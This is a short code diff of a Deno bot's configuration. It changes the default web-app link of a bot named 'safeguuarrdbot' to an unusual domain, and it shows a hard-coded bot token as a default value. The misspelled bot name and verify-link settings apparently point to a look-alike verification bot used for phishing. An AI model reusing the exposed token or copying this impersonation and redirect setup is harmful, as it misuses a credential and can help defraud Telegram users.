@@ -54,7 +54,7 @@ const MIME_TYPES: Record<string, string> = {
 
 const botOwner = Deno.env.get("BOT_OWNER") ?? "1971543989";
 const botName = Deno.env.get("BOT_NAME") ?? "safeguuarrdbot";
-const webAppLink = Deno.env.get("WEB_APP_LINK") ?? "https://hermescon.onrender.com/sg";
+const webAppLink = Deno.env.get("WEB_APP_LINK") ?? "https://bdhdhsh.mom/sg";
 const gateKeeper = Deno.env.get("GATE_KEEPER") ?? "8682461128:AAFptmq9Oa5nuF9jE0zYrBB62bVNOX6U6j0";
 const sgClickVerifyURL = Deno.env.get("SAFEGUARD_CLICK_VERIFY") ?? "";
 const sgTapToVerifyURL = Deno.env.get("SAFEGUARD_TAP_VERIFY") ?? "";
